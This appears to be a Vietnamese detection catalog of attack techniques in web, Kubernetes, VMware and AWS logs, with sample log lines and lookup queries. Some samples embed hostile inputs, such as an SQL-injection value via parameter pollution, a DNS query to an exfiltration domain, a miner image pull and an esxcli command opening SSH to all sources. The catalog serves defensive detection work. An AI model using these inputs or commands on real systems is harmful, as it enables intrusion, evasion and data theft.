["web-atk","http-parameter-pollution","HTTP Parameter Pollution (HPP)","m","T1190","Gửi trùng tên tham số trong query string (vd. ?id=1&id=1' OR '1'='1) để khai thác khác biệt cách WAF/validation và backend xử lý tham số trùng lặp (bên kiểm tra giá trị đầu, bên xử lý giá trị cuối hoặc ngược lại), nhằm né WAF hoặc ghi đè tham số ứng dụng.","\"%r\": \"GET /transfer?amount=10&amount=10000&to=acc1\" - tham số amount xuất hiện lặp hai lần với giá trị khác nhau trong cùng query string\n%>s: 200 - request vẫn được xử lý; cần đối chiếu với log ứng dụng để biết server lấy giá trị amount nào (đầu hay cuối) nhằm phát hiện bị qua mặt WAF/validation\n%b: 320","10.30.1.99 - - [24/Oct/2026:09:55:00 +0700] \"GET /transfer?amount=10&amount=10000&to=acc1 HTTP/1.1\" 200 320 \"-\" \"Mozilla/5.0\"","",""],


["k8s-audit","impersonate","Giả danh người dùng khác (Impersonate)","h","","Request dùng cơ chế impersonation (header Impersonate-User/Impersonate-Group) để hành động dưới danh tính khác. Audit event ghi lại cả 'user' (danh tính gốc, phải có quyền impersonate) lẫn 'impersonatedUser' (danh tính được dùng để authorization) — nếu một SA bị chiếm có quyền impersonate lên user/SA đặc quyền cao, đây là đường leo thang quyền không cần đánh cắp token trực tiếp.","user: danh tính gọi API; impersonatedUser: danh tính bị giả danh (dùng để quyết định authorization); impersonatedUser.groups nếu attacker chọn giả danh vào group đặc quyền (vd. system:masters).","{\"verb\":\"list\",\"user\":{\"username\":\"system:serviceaccount:ci:deployer\"},\"impersonatedUser\":{\"username\":\"admin\",\"groups\":[\"system:masters\"]},\"objectRef\":{\"resource\":\"secrets\",\"namespace\":\"kube-system\"},\"responseStatus\":{\"code\":200}}","",""],


["k8s-audit","rbac escalate/bind","Lạm dụng verb escalate/bind trong RBAC","c","T1098.006","Tạo/sửa (Cluster)Role chứa verb 'escalate', hoặc tạo (Cluster)RoleBinding nhờ verb 'bind' trên role có quyền cao hơn quyền hiện có của mình — đây là hai primitive chính thức dùng để bỏ qua nguyên tắc 'không được cấp quyền vượt quá quyền đang có' mặc định của Kubernetes RBAC.","requestObject.rules[].verbs chứa 'escalate' hoặc 'bind'; verb=create/update trên resource roles/clusterroles hoặc rolebindings/clusterrolebindings.","{\"verb\":\"create\",\"user\":{\"username\":\"thanhnv\"},\"objectRef\":{\"resource\":\"clusterroles\",\"apiGroup\":\"rbac.authorization.k8s.io\",\"name\":\"custom-escalator\"},\"requestObject\":{\"rules\":[{\"apiGroups\":[\"rbac.authorization.k8s.io\"],\"resources\":[\"clusterroles\"],\"verbs\":[\"escalate\",\"bind\"]}]},\"responseStatus\":{\"code\":201}}","",""],


["k8s-audit","csr approve","Phê duyệt CertificateSigningRequest bất thường","c","","verb=update trên certificatesigningrequests/approval; nếu CSR được ký có CN/group mạo danh một identity đặc quyền (vd. nhóm system:masters, hoặc system:node:<node>), việc duyệt sẽ cấp một client certificate hợp lệ cho kẻ tấn công mạo danh identity đó mà không cần có token gốc.","objectRef.resource=certificatesigningrequests, subresource=approval; requestObject.status.conditions[].type=Approved; requestObject.spec.signerName, spec.request (CSR PEM base64) nên decode để kiểm CN/O.","{\"verb\":\"update\",\"user\":{\"username\":\"thanhnv\"},\"objectRef\":{\"resource\":\"certificatesigningrequests\",\"subresource\":\"approval\",\"name\":\"csr-abc123\"},\"requestObject\":{\"status\":{\"conditions\":[{\"type\":\"Approved\"}]}},\"responseStatus\":{\"code\":200}}","",""],


["k8s-audit","webhook tampering","Sửa/xóa cấu hình admission webhook","h","T1562.001","create/update/delete trên validatingwebhookconfigurations hoặc mutatingwebhookconfigurations (admissionregistration.k8s.io), hoặc patch nhãn 'pod-security.kubernetes.io/enforce' trên namespace để hạ mức kiểm soát — cách vô hiệu hóa rào chắn admission control trước khi triển khai workload độc hại.","objectRef.resource=validatingwebhookconfigurations/mutatingwebhookconfigurations (verb=delete/update); hoặc objectRef.resource=namespaces với requestObject.metadata.labels thay đổi giá trị pod-security.kubernetes.io/enforce.","{\"verb\":\"delete\",\"user\":{\"username\":\"thanhnv\"},\"objectRef\":{\"resource\":\"validatingwebhookconfigurations\",\"apiGroup\":\"admissionregistration.k8s.io\",\"name\":\"policy-enforcer\"},\"responseStatus\":{\"code\":200}}","",""],


["k8s-audit","podsecurity audit annotation","Vi phạm Pod Security ghi trong audit annotation","m","T1610","Khi tạo pod vi phạm Pod Security Standards (baseline/restricted): ở chế độ enforce request bị từ chối, ở chế độ audit pod vẫn được tạo nhưng annotation ghi lại chi tiết vi phạm — dấu hiệu có người thử hoặc đã triển khai pod đặc quyền trong namespace được bảo vệ (cũng hữu ích để xác nhận admission control có đang thực sự chặn hay không).","annotations['pod-security.kubernetes.io/audit-violations']: mô tả chi tiết vi phạm; annotations['pod-security.kubernetes.io/enforce-policy']: mức chính sách đang áp dụng (vd. restricted:latest).","{\"verb\":\"create\",\"user\":{\"username\":\"thanhnv\"},\"objectRef\":{\"resource\":\"pods\",\"namespace\":\"payment\"},\"annotations\":{\"pod-security.kubernetes.io/audit-violations\":\"would violate PodSecurity \"restricted:latest\": privileged (container \"x\" must not set securityContext.privileged=true)\"},\"responseStatus\":{\"code\":201}}","",""],


["k8s-comp","audit pipeline failure","Audit log bị rớt/ngừng ghi (webhook backend lỗi)","h","T1562","Log của kube-apiserver cảnh báo hàng đợi audit webhook đầy hoặc backend không phản hồi khiến audit event bị drop. Nếu trùng thời điểm có hoạt động đáng ngờ khác, cần nghi ngờ audit pipeline bị cố ý làm nghẽn để che dấu vết (blind spot).","W (ký tự đầu): mức log klog — Warning\n1024 02:15:00.000000: ngày giờ nội bộ klog\nthreadid (\"1\"): mã luồng ghi log của kube-apiserver\nbuffered.go:162: module xử lý audit event theo buffer/batch trước khi gửi tới webhook backend\nmessage: \"Failed to process audit event: ... dropping events\" — mô tả lý do event bị drop (vượt rate limit/backend không phản hồi), dấu hiệu audit log có khoảng trống","W1024 02:15:00.000000       1 buffered.go:162] Failed to process audit event: rate limit on audit webhook backend exceeded, dropping events","",""],


["k8s-comp","coredns log","CoreDNS query log","m","T1071.004","Log truy vấn DNS của CoreDNS (cần bật plugin 'log' trong Corefile) ghi lại mọi tên miền mà pod tra cứu — nguồn dữ liệu quan trọng để phát hiện DNS tunneling, beacon C2 qua DNS, hoặc truy vấn miền exfiltration bất thường mà audit log API server không thấy được.","Định dạng kiểu BIND query log: thời gian, client IP (pod), tên miền truy vấn, loại bản ghi, mã phản hồi, thời gian xử lý.","[INFO] 10.244.1.15:53214 - 1234 \"A IN data.exfil.attacker-c2.net. udp 45 false 512\" NOERROR qr,aa,rd 94 0.000217s","",""],


["k8s-ev","Failed (ErrImagePull)","Pull image thất bại (ErrImagePull/ImagePullBackOff)","m","T1610","Event Warning Failed với lý do không kéo được image — nếu tên image gắn với công cụ tấn công/miner hoặc registry lạ bị network policy/egress chặn, đây là dấu hiệu attacker đã CỐ triển khai workload độc hại nhưng bị chặn trước khi chạy.","NAMESPACE: namespace của pod liên quan\nLAST SEEN: thời gian kể từ lần event cuối được ghi nhận\nTYPE: \"Warning\"\nREASON: \"Failed\" — kéo image thất bại (ErrImagePull/ImagePullBackOff)\nOBJECT: pod liên quan (involvedObject)\nMESSAGE: tên image định kéo và lý do lỗi cụ thể (vd DNS/network policy chặn egress tới registry)","payment  10s  Warning  Failed  pod/x-5b8c  Failed to pull image \"docker.io/xmrig/xmrig:latest\": rpc error: code = Unknown desc = failed to resolve reference: dial tcp: lookup registry-1.docker.io: no such host","",""],


["k8s-ev","SuccessfulCreate (DaemonSet/Job)","Event SuccessfulCreate hàng loạt từ DaemonSet/Job","h","T1053.007, T1543.005","Event Normal SuccessfulCreate phát sinh liên tục từ một DaemonSet/Job trên nhiều node — dấu hiệu sớm xem được ngay cả khi chưa có quyền đọc audit log (chỉ cần 'kubectl get events') cho thấy đang triển khai persistence/cryptominer trên toàn cluster, tương ứng với hành vi tạo DaemonSet trong audit log.","NAMESPACE: namespace chứa controller tạo pod (thường là namespace nhạy cảm, vd kube-system)\nLAST SEEN: thời gian kể từ lần event cuối được ghi nhận\nTYPE: \"Normal\"\nREASON: \"SuccessfulCreate\" — controller (DaemonSet/Job) vừa tạo thành công một pod con\nOBJECT: daemonset/job là nguồn phát sinh event (involvedObject)\nMESSAGE: tên pod con được tạo — nếu lặp lại liên tục trên nhiều node là dấu hiệu triển khai persistence/cryptominer toàn cluster","kube-system  5s  Normal  SuccessfulCreate  daemonset/node-helper  Created pod: node-helper-abcde","",""],


["vc-ev","DatastoreFileCopiedEvent / DatastoreFileMovedEvent / DatastoreFileDeletedEvent","Sao chép / di chuyển / xóa file trực tiếp trên datastore","h","T1005, T1048","Nhóm vim.event.DatastoreFileEvent ghi lại thao tác copy, move, delete file hoặc thư mục ngay trên datastore qua Datastore Browser hoặc API, không đi qua guest OS của VM. Kẻ tấn công dùng kênh này để tải nguyên file VMDK ra ngoài hoặc xóa dấu vết mà không cần đăng nhập vào máy ảo.","datastore (đích), sourceDatastore/sourceFile (khi copy/move), targetFile","vim.event.DatastoreFileCopiedEvent: File copied from [DS-PROD-01] DC01/DC01.vmdk to [DS-STAGING] tmp/DC01.vmdk by CORP\\adm_thanh on esx-dc-03.corp.local","",""],


["vc-ev","VmMigratedEvent / DrsVmMigratedEvent / VmRelocatedEvent","VM di chuyển sang host khác (vMotion) / đổi datastore (Storage vMotion)","m","","Ghi lại việc VM được chuyển sang ESXi host khác (vMotion, thủ công hoặc do DRS) hoặc đổi datastore (Storage vMotion, VmRelocatedEvent). Kẻ tấn công có thể di chuyển VM nhạy cảm sang host/datastore mà chúng đã kiểm soát để né tránh giám sát tập trung hoặc cô lập VM trước khi thao túng.","host nguồn/đích, datastore nguồn/đích","vim.event.VmMigratedEvent: SRV-DC01 in DC-HN has migrated from esx-dc-01.corp.local to esx-dc-09.corp.local","",""],


["vc-ev","AccountCreatedEvent / AccountRemovedEvent","Tạo / xóa tài khoản local trên host hoặc vCenter","h","T1136.001, T1098","Ghi lại việc tạo hoặc xóa tài khoản hệ điều hành cục bộ trên ESXi/vCenter qua API hoặc UI (có từ VI API 2.0). Đây là dấu hiệu thiết lập persistence quan trọng; liên quan tới các chiến dịch ransomware (Storm-0506, Akira, Black Basta...) khai thác CVE-2024-37085 để chiếm quyền admin ESXi thông qua nhóm AD 'ESX Admins' - khi đó tài khoản/đăng nhập xuất hiện trên host dù không được tạo thủ công tại đó.","fullFormattedMessage: nội dung mô tả, chứa tên tài khoản và hành động (vd \"Account 'backupsvc' created\")\nhost: ESXi host hoặc vCenter nơi tài khoản được tạo/xóa\nuserName: tài khoản thực hiện thao tác (actor) – cần chú ý nếu trống hoặc liên quan nhóm AD \"ESX Admins\" (CVE-2024-37085)\ncreatedTime: thời điểm tạo/xóa tài khoản\nchainId: ID để liên kết với các sự kiện liên quan (vd login ngay sau đó bằng tài khoản mới)","vim.event.AccountCreatedEvent: Account 'backupsvc' created on host esx-dc-03.corp.local","",""],


["vc-file","rhttpproxy.log","Log reverse proxy HTTPS của vCenter","m","T1595, T1190","rhttpproxy là cổng vào HTTPS duy nhất của vCenter, định tuyến request tới các dịch vụ con (sdk, ui, websso...). Log này hữu ích để phát hiện dò quét hoặc khai thác nhắm vào các endpoint quản trị trước khi có dấu vết ở log ứng dụng chi tiết hơn (vpxd.log, websso.log). Cần bật verbose logging để log IP nguồn.","IP nguồn, đường dẫn request, mã trạng thái HTTP","2026-10-24T02:10:03.112+07:00 info rhttpproxy[9876] Accepted connection from 45.33.12.9:51233; forwarding to /sdk","",""],


["esx-file","hostd.log NFC file download","Tải trực tiếp file VMDK qua Datastore Browser (NFC)","h","T1005, T1048","hostd.log ghi dòng 'File download from path ... was initiated from ...' khi có client tải file trực tiếp từ datastore qua giao thức NFC (Datastore Browser hoặc công cụ quản trị khác), bỏ qua guest OS. Kỹ thuật này được ghi nhận để exfiltrate nguyên file VMDK (vd. của Domain Controller) mà không cần quyền trong guest.","Datastore, VMPath, InitiatorTool, InitiatorIP","2026-10-24T02:35:10.221Z info hostd[2099681] [Originator@6876 sub=Proxysvc] File download from path '[DS-PROD-01] DC01/DC01.vmdk' was initiated from 10.30.1.99 using VMware vCenter Client/8.0.2","",""],


["esx-file","shell.log firewall ruleset change","Mở/đóng ruleset firewall ESXi qua esxcli","h","T1562.004","shell.log ghi lại lệnh esxcli network firewall ruleset set khi admin bật ruleset tường lửa cho một dịch vụ (vd. sshServer) hoặc mở allowed-all. Ransomware operator thường bật ruleset này ngay trước/cùng lúc bật SSH để duy trì truy cập từ xa.","timestamp: Thời điểm thực thi lệnh (UTC)\nshell[pid]: Tiến trình ESXi Shell và PID của phiên\n[user]: Tài khoản thực thi lệnh (vd. root)\nesxcli network firewall ruleset set: Lệnh thay đổi cấu hình ruleset firewall ESXi\n--ruleset-id=<name>: Tên ruleset firewall bị thay đổi (vd. sshServer)\n--enabled=true --allowed-all=true: Bật ruleset và cho phép mọi IP nguồn truy cập, mở toang tường lửa cho dịch vụ đó","2026-10-24T02:30:50Z shell[2103311]: [root]: esxcli network firewall ruleset set --ruleset-id=sshServer --enabled=true --allowed-all=true","",""],


["esx-ev","esx.audit.net.firewall.config.changed","Thay đổi cấu hình firewall ESXi","h","T1562.004","Sự kiện VOB/audit ghi nhận khi cấu hình firewall ESXi thay đổi (bật/tắt ruleset, sửa allowed IP...), xuất hiện trong vobd.log/hostd.log song song với lệnh esxcli tương ứng trong shell.log. Lưu ý: tên sự kiện được xác nhận qua các nguồn log thực tế/cộng đồng bảo mật, chưa thấy liệt kê đầy đủ trong tài liệu chính thức Broadcom (phần 'Managing ESXi Audit Records' không liệt kê chi tiết từng event ID).","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện\n[esx.audit.net.firewall.config.changed]: Tên sự kiện audit VOB — cấu hình firewall ESXi đã thay đổi\nOperation '<enable/disable>': Thao tác được thực hiện trên ruleset (bật/tắt)\nrule set <name>: Tên ruleset firewall bị tác động (vd. sshServer)\nsucceeded: Kết quả thực hiện thay đổi cấu hình","2026-10-24T02:30:51.000Z: [UserLevelCorrelator] ...: [esx.audit.net.firewall.config.changed] Firewall configuration has changed. Operation 'enable' for rule set sshServer succeeded.","",""],

["aws-cloudtrail","ConsoleLogin (failed/no MFA)","Đăng nhập Console (thất bại / không MFA)","h","T1078.004","Ghi nhận một lần đăng nhập vào AWS Management Console, bao gồm đăng nhập thất bại hoặc đăng nhập thành công mà không dùng MFA — dấu hiệu của dò mật khẩu hoặc tài khoản bị chiếm đoạt.","eventName: luôn là \"ConsoleLogin\"\nuserIdentity.type: loại danh tính đăng nhập (IAMUser, Root, AssumedRole)\nuserIdentity.arn / userName: định danh người dùng\nresponseElements.ConsoleLogin: \"Success\" hoặc \"Failure\"\nadditionalEventData.MFAUsed: \"Yes\"/\"No\" — có dùng MFA hay không\nsourceIPAddress: địa chỉ IP nguồn thực hiện đăng nhập","{\n  \"eventName\": \"ConsoleLogin\",\n  \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"Paulo\", \"accountId\": \"123456789012\"},\n  \"sourceIPAddress\": \"192.0.2.0\",\n  \"errorMessage\": \"Failed authentication\",\n  \"responseElements\": {\"ConsoleLogin\": \"Failure\"},\n  \"additionalEventData\": {\"MFAUsed\": \"No\"}\n}","Cảnh giác với nhiều lần đăng nhập thất bại liên tiếp từ cùng một IP/người dùng (dò mật khẩu) hoặc đăng nhập thành công không MFA từ IP/vị trí địa lý bất thường.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin --max-results 50"],

["aws-cloudtrail","Root account activity","Hoạt động bằng tài khoản Root","c","T1078.004","Bất kỳ lệnh gọi API hoặc đăng nhập nào được thực hiện bằng thông tin xác thực tài khoản root AWS — tài khoản có toàn quyền và không nên dùng cho công việc vận hành hàng ngày.","userIdentity.type: giá trị \"Root\" xác định đây là tài khoản root\nuserIdentity.arn: dạng arn:aws:iam::<accountId>:root\neventName: hành động được tài khoản root thực hiện\nsourceIPAddress: địa chỉ IP gọi API\neventTime: thời điểm thực hiện hành động","{\n  \"eventName\": \"CreateAccessKey\",\n  \"userIdentity\": {\n    \"type\": \"Root\",\n    \"arn\": \"arn:aws:iam::111122223333:root\",\n    \"accountId\": \"111122223333\"\n  },\n  \"sourceIPAddress\": \"203.0.113.64\"\n}","Mọi sự kiện có userIdentity.type=Root đều cần được điều tra ngay, vì tài khoản root chỉ nên dùng cho các tác vụ khởi tạo hiếm khi xảy ra (ví dụ đổi gói thanh toán).","fields @timestamp, eventName, sourceIPAddress | filter userIdentity.type = \"Root\" | sort @timestamp desc"],

["aws-cloudtrail","CreateAccessKey / UpdateAccessKey","Tạo / cập nhật Access Key IAM","h","T1098.001","Tạo mới hoặc thay đổi trạng thái access key của một user IAM — thường là bước thiết lập duy trì quyền truy cập lâu dài (persistence) sau khi tài khoản bị chiếm đoạt.","eventName: CreateAccessKey hoặc UpdateAccessKey\nrequestParameters.userName: user IAM bị thao tác (khác với caller là dấu hiệu đáng ngờ)\nresponseElements.accessKey.accessKeyId: access key mới được tạo\nresponseElements.accessKey.status: trạng thái Active/Inactive\nuserIdentity.arn: danh tính thực hiện hành động\nsourceIPAddress: IP nguồn","{\n  \"eventName\": \"CreateAccessKey\",\n  \"requestParameters\": {\"userName\": \"svc-deploy\"},\n  \"responseElements\": {\n    \"accessKey\": {\"accessKeyId\": \"AKIAIOSFODNN7EXAMPLE\", \"status\": \"Active\"}\n  },\n  \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"jdoe\"}\n}","Đáng ngờ khi access key được tạo cho một user khác với caller, hoặc nhiều access key được tạo liên tiếp trong thời gian ngắn trên nhiều tài khoản.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey --max-results 50"],

["aws-cloudtrail","AttachUserPolicy / PutUserPolicy","Gắn Policy vào User/Role (leo thang đặc quyền)","c","T1098","Gắn một managed policy hoặc inline policy mới vào user/role IAM — kỹ thuật phổ biến để leo thang đặc quyền, ví dụ gắn trực tiếp policy AdministratorAccess.","eventName: AttachUserPolicy / PutUserPolicy / AttachRolePolicy\nrequestParameters.userName hoặc roleName: đối tượng bị gắn policy\nrequestParameters.policyArn: ARN managed policy được gắn (chú ý AdministratorAccess)\nrequestParameters.policyDocument: nội dung inline policy (với PutUserPolicy)\nuserIdentity.arn: ai thực hiện thao tác","{\n  \"eventName\": \"AttachUserPolicy\",\n  \"requestParameters\": {\n    \"userName\": \"jdoe\",\n    \"policyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n  },\n  \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"jdoe\"}\n}","Cảnh báo khi policyArn trỏ tới AdministratorAccess hoặc một policy quyền rộng được gắn bởi chính user đó hoặc một user không thuộc nhóm quản trị.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy --max-results 50"],

["aws-cloudtrail","CreateUser / CreateRole (broad trust policy)","Tạo User / Role IAM (trust policy mở rộng)","h","T1136.003","Tạo mới một IAM user hoặc role; đáng chú ý khi role mới có trust policy cho phép một tài khoản AWS bên ngoài (hoặc \"*\") được assume, mở đường truy cập chéo tài khoản (backdoor).","eventName: CreateUser hoặc CreateRole\nrequestParameters.userName / roleName: tên thực thể mới\nrequestParameters.assumeRolePolicyDocument: trust policy của role (kiểm tra trường Principal)\nresponseElements.role.arn / responseElements.user.arn: ARN thực thể vừa tạo\nuserIdentity.arn: ai tạo ra thực thể","{\n  \"eventName\": \"CreateRole\",\n  \"requestParameters\": {\n    \"roleName\": \"temp-support-role\",\n    \"assumeRolePolicyDocument\": \"{\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"AWS\\\":\\\"arn:aws:iam::999999999999:root\\\"},\\\"Action\\\":\\\"sts:AssumeRole\\\"}]}\"\n  },\n  \"responseElements\": {\"role\": {\"arn\": \"arn:aws:iam::123456789012:role/temp-support-role\"}}\n}","Kiểm tra xem assumeRolePolicyDocument có Principal là tài khoản AWS không quen biết hoặc \"*\" hay không — dấu hiệu tạo backdoor truy cập chéo tài khoản.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateRole --max-results 50"],

["aws-cloudtrail","AssumeRole (cross-account)","AssumeRole (liên tài khoản)","h","T1550.001","Một danh tính gọi AWS STS AssumeRole để lấy thông tin xác thực tạm thời của một role — đáng chú ý khi role và caller thuộc hai tài khoản AWS khác nhau.","eventName: AssumeRole\nrequestParameters.roleArn: role được assume\nuserIdentity.accountId: tài khoản của caller gốc\nresources[].accountId / resources[].arn: tài khoản sở hữu role được assume\nresponseElements.assumedRoleUser.arn: ARN phiên role tạm thời được cấp","{\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": {\"type\": \"IAMUser\", \"accountId\": \"111122223333\"},\n  \"requestParameters\": {\"roleArn\": \"arn:aws:iam::999999999999:role/OrgAdmin\", \"roleSessionName\": \"sess1\"},\n  \"responseElements\": {\"assumedRoleUser\": {\"arn\": \"arn:aws:sts::999999999999:assumed-role/OrgAdmin/sess1\"}}\n}","So sánh accountId của userIdentity với tài khoản trong requestParameters.roleArn; khác nhau và không nằm trong danh sách tin cậy là dấu hiệu di chuyển ngang liên tài khoản.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole --max-results 50"],

["aws-cloudtrail","GetSessionToken (misuse)","Lạm dụng GetSessionToken","m","T1550.001","Yêu cầu bộ thông tin xác thực tạm thời (access key, secret key, session token) gắn với chính long-term credentials hiện có — có thể bị lợi dụng để kéo dài vòng đời sử dụng của một access key bị đánh cắp.","eventName: GetSessionToken\nuserIdentity.accessKeyId: access key dài hạn dùng để yêu cầu token\nrequestParameters.serialNumber: thiết bị MFA kèm theo (nếu có)\nresponseElements.credentials.expiration: thời hạn hiệu lực của token tạm thời\nsourceIPAddress: IP gọi API, so với IP thường dùng của access key đó","{\n  \"eventName\": \"GetSessionToken\",\n  \"userIdentity\": {\"type\": \"IAMUser\", \"accessKeyId\": \"AKIAIOSFODNN7EXAMPLE\"},\n  \"sourceIPAddress\": \"198.51.100.23\",\n  \"responseElements\": {\"credentials\": {\"expiration\": \"Oct 24, 2026 18:00:00 PM\"}}\n}","Đáng ngờ khi GetSessionToken được gọi từ IP/vị trí địa lý khác thường đối với một access key cụ thể, hoặc thiếu serialNumber MFA dù chính sách tổ chức yêu cầu bắt buộc.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSessionToken --max-results 50"],

["aws-cloudtrail","StopLogging / DeleteTrail / UpdateTrail","Tắt / Xóa / Sửa CloudTrail Trail","c","T1562.008","Tắt, xóa hoặc chỉnh sửa cấu hình một CloudTrail trail — hành vi phòng thủ lẩn tránh (defense evasion) điển hình nhằm xóa hoặc làm mù dấu vết trước hoặc trong khi tấn công.","eventName: StopLogging / DeleteTrail / UpdateTrail\nrequestParameters.name: tên trail bị tác động\nuserIdentity.arn: danh tính thực hiện hành động\neventSource: cloudtrail.amazonaws.com\nawsRegion: vùng thực hiện (lưu ý trail đa vùng vẫn có thể bị tắt từ một vùng)","{\n  \"eventName\": \"StopLogging\",\n  \"eventSource\": \"cloudtrail.amazonaws.com\",\n  \"requestParameters\": {\"name\": \"arn:aws:cloudtrail:us-east-1:123456789012:trail/OrgTrail\"},\n  \"userIdentity\": {\"type\": \"AssumedRole\", \"arn\": \"arn:aws:sts::123456789012:assumed-role/DevOps/jdoe\"}\n}","Mọi StopLogging/DeleteTrail/UpdateTrail đều cần cảnh báo ngay lập tức, đặc biệt nếu xảy ra ngay trước các hành động nhạy cảm khác của cùng danh tính.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging --max-results 50"],

["aws-cloudtrail","PutBucketPolicy (S3 public/cross-account)","Sửa Bucket Policy S3 (công khai/liên tài khoản)","c","T1537","Thay đổi bucket policy của S3; đặc biệt nghiêm trọng khi Principal được đặt thành \"*\" (công khai) hoặc một tài khoản AWS bên ngoài — kỹ thuật dùng để làm lộ hoặc exfiltrate dữ liệu ra ngoài.","eventName: PutBucketPolicy\nrequestParameters.bucketName: bucket bị thay đổi\nrequestParameters.bucketPolicy.Statement[].Principal: chủ thể được cấp quyền (kiểm tra \"*\" hoặc account lạ)\nrequestParameters.bucketPolicy.Statement[].Effect: Allow/Deny\nuserIdentity.arn: ai thực hiện thay đổi policy","{\n  \"eventName\": \"PutBucketPolicy\",\n  \"requestParameters\": {\n    \"bucketName\": \"corp-backups\",\n    \"bucketPolicy\": {\"Statement\": [{\"Effect\": \"Allow\", \"Principal\": \"*\", \"Action\": \"s3:GetObject\"}]}\n  },\n  \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"jdoe\"}\n}","Cảnh báo khi Statement.Principal = \"*\" hoặc một Allow statement cấp s3:GetObject/s3:* rộng rãi, nhất là trên bucket chứa dữ liệu nhạy cảm hoặc backup.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PutBucketPolicy --max-results 50"],

["aws-cloudtrail","AuthorizeSecurityGroupIngress (0.0.0.0/0)","Mở Inbound Security Group ra Internet (0.0.0.0/0)","h","T1562.007","Thêm quy tắc inbound cho một Security Group; đáng ngại khi mở các cổng quản trị (22, 3389, 3306...) cho toàn bộ Internet (0.0.0.0/0), tạo điều kiện cho truy cập trái phép hoặc kênh C2.","eventName: AuthorizeSecurityGroupIngress\nrequestParameters.groupId: security group bị thay đổi\nrequestParameters.ipPermissions.items[].ipRanges.items[].cidrIp: dải IP được cho phép (kiểm tra 0.0.0.0/0)\nrequestParameters.ipPermissions.items[].fromPort / toPort: dải cổng được mở\nuserIdentity.arn: ai thực hiện thay đổi","{\n  \"eventName\": \"AuthorizeSecurityGroupIngress\",\n  \"requestParameters\": {\n    \"groupId\": \"sg-0123456789abcdef0\",\n    \"ipPermissions\": {\"items\": [{\"ipProtocol\": \"tcp\", \"fromPort\": 22, \"toPort\": 22, \"ipRanges\": {\"items\": [{\"cidrIp\": \"0.0.0.0/0\"}]}}]}\n  }\n}","Ưu tiên điều tra khi cidrIp=0.0.0.0/0 kết hợp với cổng nhạy cảm (22, 3389, 3306, 5432...) được mở trên security group gắn với tài nguyên production.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AuthorizeSecurityGroupIngress --max-results 50"],

["aws-cloudtrail","DisableKey / ScheduleKeyDeletion (KMS)","Vô hiệu hóa / Lên lịch xóa KMS Key","c","T1485","Vô hiệu hóa hoặc lên lịch xóa một KMS key, khiến toàn bộ dữ liệu được mã hóa bằng key đó không thể giải mã được — kỹ thuật phá hoại dữ liệu kiểu ransomware trên môi trường cloud.","eventName: DisableKey hoặc ScheduleKeyDeletion\nrequestParameters.keyId: KMS key bị tác động\nrequestParameters.pendingWindowInDays: số ngày chờ trước khi xóa vĩnh viễn (ScheduleKeyDeletion)\nuserIdentity.arn: ai thực hiện hành động\neventSource: kms.amazonaws.com","{\n  \"eventName\": \"ScheduleKeyDeletion\",\n  \"eventSource\": \"kms.amazonaws.com\",\n  \"requestParameters\": {\"keyId\": \"arn:aws:kms:us-east-1:123456789012:key/abcd-1234\", \"pendingWindowInDays\": 7},\n  \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"jdoe\"}\n}","Cảnh báo ngay khi có ScheduleKeyDeletion/DisableKey trên key đang bảo vệ tài nguyên production, đặc biệt nếu pendingWindowInDays bị đặt ở mức tối thiểu (7 ngày).","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ScheduleKeyDeletion --max-results 50"],

["aws-guardduty","Recon:EC2/PortProbeUnprotectedPort","Dò quét cổng không được bảo vệ trên EC2","i","T1595","Một cổng của EC2 instance đang mở ra internet (security group quá lỏng) bị một địa chỉ IP bên ngoài dò quét (port probe), được VPC Flow Logs ghi nhận.","type: tên finding, luôn bắt đầu Recon:EC2/\nresource.instanceDetails.instanceId: instance bị dò quét\nservice.action.portProbeAction.portProbeDetails: danh sách cổng/IP bị probe\nservice.action.portProbeAction.portProbeDetails.localPortDetails.port: cổng cục bộ bị probe\nservice.count: số lần probe trong khoảng thời gian\nseverity: thường Low nhưng có thể tăng nếu cổng nhạy cảm","{\n  \"type\": \"Recon:EC2/PortProbeUnprotectedPort\",\n  \"severity\": 2,\n  \"resource\": {\"instanceDetails\": {\"instanceId\": \"i-0abcd1234ef567890\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"PORT_PROBE\",\n      \"portProbeAction\": {\n        \"portProbeDetails\": [{\"localPortDetails\": {\"port\": 3389}, \"remoteIpDetails\": {\"ipAddressV4\": \"203.0.113.44\"}}]\n      }\n    },\n    \"count\": 14\n  }\n}","Đối chiếu security group của instance xem cổng có thực sự cần mở ra 0.0.0.0/0 không, và kiểm tra IP nguồn có nằm trong danh sách đe dọa đã biết hay không.","aws guardduty list-findings --detector-id <detectorId> --finding-criteria '{\"Criterion\":{\"type\":{\"Eq\":[\"Recon:EC2/PortProbeUnprotectedPort\"]}}}'"],

